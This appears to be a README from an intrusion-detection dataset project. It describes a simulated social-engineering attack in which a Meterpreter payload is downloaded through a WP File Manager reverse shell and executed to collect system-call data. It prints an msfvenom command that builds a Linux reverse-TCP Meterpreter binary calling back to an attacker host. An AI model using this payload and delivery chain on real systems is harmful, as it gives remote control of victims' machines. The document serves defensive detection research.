# **Meterpreter Shell**

## **Table of Contents**

* **[Explaining the Attack](#explaining-the-attack)**
* **[How to Use](#how-to-use)**
  * **[Configurations](#configurations)**
  * **[Interactive Mode](#for-interactive-mode)** 

<br/>

## **Explaining the Attack**

This attack simulates a Social Engineering attack, where the user is lead to execute a poisoned file, since we only care about the system calls produced from actual execution of the binary we implemented the attack in the following way:

* Use [msfvenom](https://www.offsec.com/metasploit-unleashed/msfvenom/) to create the payload, in our case: `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o /tmp/shell.bin`
* Use the reverse shell through the Wp File Manager vulnerability in order to download the file to the victim. This step initially might seem like it doesn't make any sense since we're supposed to simulate and Social Engineering attack, however we use this reverse shell for 2 reasons:
  * Allow the attacker to upload the correct version of the payload, so that if you, for any reason, need to change it, it's much more practical.
  * For the connection to be established, the meterpreter listener must be running when the binary is executed, or at least, be executed immediately after. To avoid having the user jumping between VMs, once the binary is downloaded the script will allow the user to execute the file through the reverse shell by simply pressing `Enter`.
* The commands needed to create the meterpreter listener are presented through the script to the user.

By doing this, the user will control a meterpreter session on the victim system, and is free to mess around with it.

## **How to Use**

<br/>

This exploit can be ran in **interactive** mode.

From the **/path/to/project/IDS-Dataset/Attacks/WP** folder,

<br/>

### **Configurations:**

If you built the victim machine from scratch using our script you can use the following settings for Meterpreter shell attack:

``` Shell
sudo python3 main.py -c # To start the configuration process

Attacker ip: # Check the ip address with ' ifconfig '
Victim ip: # Check the ip address with ' ifconfig '
Exploit: 2
Activate auditing: y # Make sure the server is on, check Aux README for information
```

<br/>

### **For interactive mode:**
``` Shell
sudo python3 main.py # Don't forget to configure the config.ini on the 1st attack
```

As mentioned above, this will show the user te necessary commands needed to create a meterpreter listener and then allow the execution of the binary, in case the session dies.

<br/>
